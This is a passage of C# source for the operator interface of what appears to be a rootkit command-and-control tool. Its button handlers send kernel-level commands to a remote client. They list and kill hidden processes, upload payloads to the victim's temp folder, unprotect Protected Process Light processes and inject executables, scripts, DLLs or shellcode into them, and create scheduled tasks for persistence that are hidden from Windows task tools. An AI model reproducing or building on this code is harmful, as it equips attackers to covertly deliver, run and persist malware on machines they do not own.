        private void BtnListHidden_Click(object sender, RoutedEventArgs e)
        {
            Log("[LIST HIDDEN] Retrieving all hidden processes...");
            _sendCommand(_clientId, Ring0Commands.CMD_LIST_HIDDEN, null);
        }

        private void BtnKillHidden_Click(object sender, RoutedEventArgs e)
        {
            // Prompt for PID using a simple dialog
            string pidStr = Microsoft.VisualBasic.Interaction.InputBox(
                "Enter the PID of the hidden process to kill:", 
                "Kill Hidden Process", 
                "");
            
            if (string.IsNullOrEmpty(pidStr) || !uint.TryParse(pidStr, out uint pid))
            {
                if (!string.IsNullOrEmpty(pidStr))
                    Log("[ERROR] Invalid PID");
                return;
            }
            
            Log($"[KILL HIDDEN] Terminating hidden process PID {pid}...");
            _sendCommand(_clientId, Ring0Commands.CMD_KILL_HIDDEN, 
                System.Text.Encoding.UTF8.GetBytes(pid.ToString()));
        }

        // Store PPL payload file for upload
        private byte[] _pendingPplPayload = null;
        private string _pendingPplFilename = null;
        
        private void BtnBrowsePpl_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new Microsoft.Win32.OpenFileDialog
            {
                Title = "Select Payload File for PPL Injection",
                Filter = "Executable Files (*.exe;*.dll)|*.exe;*.dll|Script Files (*.bat;*.ps1)|*.bat;*.ps1|All Files (*.*)|*.*",
                CheckFileExists = true
            };
            
            if (dialog.ShowDialog() == true)
            {
                try
                {
                    _pendingPplPayload = System.IO.File.ReadAllBytes(dialog.FileName);
                    _pendingPplFilename = System.IO.Path.GetFileName(dialog.FileName);
                    txtPplDllPath.Text = $"[UPLOAD] {_pendingPplFilename} ({_pendingPplPayload.Length:N0} bytes)";
                    Log($"[PPL BROWSE] Selected: {_pendingPplFilename}");
                    Log($"[PPL BROWSE] Size: {_pendingPplPayload.Length:N0} bytes");
                    Log("[PPL BROWSE] File will be uploaded to client when injecting");
                }
                catch (Exception ex)
                {
                    Log($"[PPL BROWSE] Error reading file: {ex.Message}");
                }
            }
        }

        private void BtnInjectPpl_Click(object sender, RoutedEventArgs e)
        {
            string target = cboPplTarget?.Text?.Trim() ?? "";
            string dllPath = txtPplDllPath?.Text?.Trim() ?? "";
            
            // New payload type mapping: 0=EXE, 1=BAT, 2=PS1, 3=DLL, 4=Shellcode
            int payloadType = cboPplPayload?.SelectedIndex ?? 0;
            
            if (string.IsNullOrEmpty(target))
            {
                Log("[ERROR] Target process required");
                return;
            }
            
            string[] payloadNames = { "EXE", "BAT", "PS1", "DLL", "Shellcode" };
            string payloadName = payloadType >= 0 && payloadType < payloadNames.Length ? payloadNames[payloadType] : "Unknown";
            
            Log($"[INJECT PPL] Injecting into protected process: {target}");
            Log($"  → Payload type: {payloadName}");
            
            // Check if we have a pending upload payload
            string actualPayloadPath;
            if (_pendingPplPayload != null && _pendingPplFilename != null)
            {
                // Step 1: Upload the file to client TEMP folder first
                string base64Data = Convert.ToBase64String(_pendingPplPayload);
                string uploadParam = $"{_pendingPplFilename}|{base64Data}";
                Log($"  → Uploading payload: {_pendingPplFilename} ({_pendingPplPayload.Length:N0} bytes)");
                _sendCommand(_clientId, Ring0Commands.CMD_UPLOAD_FILE, 
                    System.Text.Encoding.UTF8.GetBytes(uploadParam));
                
                // Step 2: Use the TEMP path for injection (client will expand %TEMP%)
                actualPayloadPath = $"%TEMP%\\{_pendingPplFilename}";
                Log($"  → Payload path: {actualPayloadPath}");
                
                // Clear pending payload after use
                _pendingPplPayload = null;
                _pendingPplFilename = null;
            }
            else
            {
                actualPayloadPath = dllPath;
                if (!string.IsNullOrEmpty(dllPath)) Log($"  → Payload/Path: {dllPath}");
            }
            
            Log("  → Will unprotect PPL first, then inject...");
            
            // Try to parse target as PID, otherwise use as name
            uint targetPid = 0;
            string targetName = "";
            if (uint.TryParse(target, out uint parsedPid))
                targetPid = parsedPid;
            else
                targetName = target;
            
            _sendCommand(_clientId, Ring0Commands.CMD_INJECT_PPL, 
                System.Text.Encoding.UTF8.GetBytes($"{payloadType},{targetPid},{targetName},{actualPayloadPath}"));
        }

        // Store the task payload file bytes for upload
        private byte[] _pendingTaskPayload = null;
        private string _pendingTaskFilename = null;

        private void CboTaskTemplate_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            // Skip if controls aren't loaded yet (XAML initialization)
            if (txtTaskCommand == null) return;
            
            // Get the selected template index
            int templateIndex = cboTaskTemplate?.SelectedIndex ?? 0;
            
            // Update the payload field hint based on template
            switch (templateIndex)
            {
                case 0: // Custom
                    txtTaskCommand.Text = "";
                    txtTaskCommand.ToolTip = "Full path to executable on client, or use Browse to upload";
                    break;
                case 1: // Run on Boot (SYSTEM)
                    txtTaskCommand.ToolTip = "Runs as SYSTEM at boot (before logon) - use Browse to select payload";
                    Log("[TASK TEMPLATE] Selected: Run on Boot (SYSTEM) - task runs at system startup");
                    break;
                case 2: // Run on Logon (User)
                    txtTaskCommand.ToolTip = "Runs as current user at logon - use Browse to select payload";
                    Log("[TASK TEMPLATE] Selected: Run on Logon (User) - task runs when user logs in");
                    break;
                case 3: // Run Every 5 Minutes
                    txtTaskCommand.ToolTip = "Runs every 5 minutes - use Browse to select payload";
                    Log("[TASK TEMPLATE] Selected: Run Every 5 Minutes - interval persistence");
                    break;
            }
        }

        private void BtnBrowseTask_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var dialog = new Microsoft.Win32.OpenFileDialog
                {
                    Title = "Select Task Payload to Upload",
                    Filter = "All Files (*.*)|*.*|" +
                             "Executables (*.exe)|*.exe|" +
                             "Scripts (*.bat;*.ps1;*.vbs)|*.bat;*.ps1;*.vbs|" +
                             "Binary (*.bin)|*.bin",
                    CheckFileExists = true
                };

                if (dialog.ShowDialog() == true)
                {
                    string filename = System.IO.Path.GetFileName(dialog.FileName);
                    
                    // Read the file
                    _pendingTaskPayload = System.IO.File.ReadAllBytes(dialog.FileName);
                    _pendingTaskFilename = filename;
                    
                    // Update the textbox to show we'll upload this file
                    txtTaskCommand.Text = $"[UPLOAD] {filename} ({_pendingTaskPayload.Length:N0} bytes)";
                    
                    Log($"[TASK BROWSE] Selected: {filename}");
                    Log($"[TASK BROWSE] Size: {_pendingTaskPayload.Length:N0} bytes");
                    Log($"[TASK BROWSE] File will be uploaded to client when task is created");
                }
            }
            catch (Exception ex)
            {
                Log($"[ERROR] Failed to browse for task file: {ex.Message}");
            }
        }

        private void BtnCreateTask_Click(object sender, RoutedEventArgs e)
        {
            string taskName = txtTaskName?.Text?.Trim() ?? "";
            string payload = txtTaskCommand?.Text?.Trim() ?? "";
            int templateIndex = cboTaskTemplate?.SelectedIndex ?? 0;
            
            if (string.IsNullOrEmpty(taskName))
            {
                Log("[ERROR] Task name required");
                return;
            }
            if (string.IsNullOrEmpty(payload) && _pendingTaskPayload == null)
            {
                Log("[ERROR] Payload required - enter path or use Browse to select file");
                return;
            }
            
            // Map template to trigger type: 0=Boot, 1=Logon, 2=Scheduled
            int triggerType;
            string triggerName;
            switch (templateIndex)
            {
                case 1: // Run on Boot (SYSTEM)
                    triggerType = 0;
                    triggerName = "Boot (SYSTEM)";
                    break;
                case 2: // Run on Logon (User)
                    triggerType = 1;
                    triggerName = "Logon (User)";
                    break;
                case 3: // Run Every 5 Minutes
                    triggerType = 2;
                    triggerName = "Every 5 Minutes";
                    break;
                default: // Custom - use boot as fallback
                    triggerType = 0;
                    triggerName = "Custom (Boot)";
                    break;
            }
            
            // Determine the actual command path
            string command = payload;
            if (_pendingTaskPayload != null && _pendingTaskFilename != null)
            {
                // Step 1: Upload the file to client TEMP folder first
                string base64Data = Convert.ToBase64String(_pendingTaskPayload);
                string uploadParam = $"{_pendingTaskFilename}|{base64Data}";
                Log($"[CREATE TASK] Uploading payload: {_pendingTaskFilename} ({_pendingTaskPayload.Length:N0} bytes)");
                _sendCommand(_clientId, Ring0Commands.CMD_UPLOAD_FILE, 
                    System.Text.Encoding.UTF8.GetBytes(uploadParam));
                
                // Step 2: Use the TEMP path for the task command (client will expand %TEMP%)
                command = $"%TEMP%\\{_pendingTaskFilename}";
                Log($"[CREATE TASK] Task command: {command}");
                
                // Clear pending payload after use
                _pendingTaskPayload = null;
                _pendingTaskFilename = null;
            }
            
            Log($"[CREATE TASK] Creating hidden scheduled task...");
            Log($"  → Name: {taskName}");
            Log($"  → Trigger: {triggerName}");
            Log($"  → Hidden from: schtasks.exe, Task Scheduler, Get-ScheduledTask");
            
            _sendCommand(_clientId, Ring0Commands.CMD_CREATE_HIDDEN_TASK, 
                System.Text.Encoding.UTF8.GetBytes($"{taskName},{command},{triggerType},"));
        }

        private void BtnListTasks_Click(object sender, RoutedEventArgs e)
        {
            Log("[LIST TASKS] Retrieving all hidden scheduled tasks...");
            _sendCommand(_clientId, Ring0Commands.CMD_LIST_HIDDEN_TASKS, null);
        }

        private void BtnDeleteTask_Click(object sender, RoutedEventArgs e)
        {
            string taskName = txtTaskName?.Text?.Trim() ?? "";
            if (string.IsNullOrEmpty(taskName))
            {
                Log("[ERROR] Enter the task name to delete in the Task Name field");
                return;
            }
            
            Log($"[DELETE TASK] Deleting hidden task: {taskName}...");
            Log($"  → Task will be permanently removed from rootkit registry");
            _sendCommand(_clientId, Ring0Commands.CMD_DELETE_HIDDEN_TASK, 
                System.Text.Encoding.UTF8.GetBytes(taskName));
        }

        #endregion

    }
}

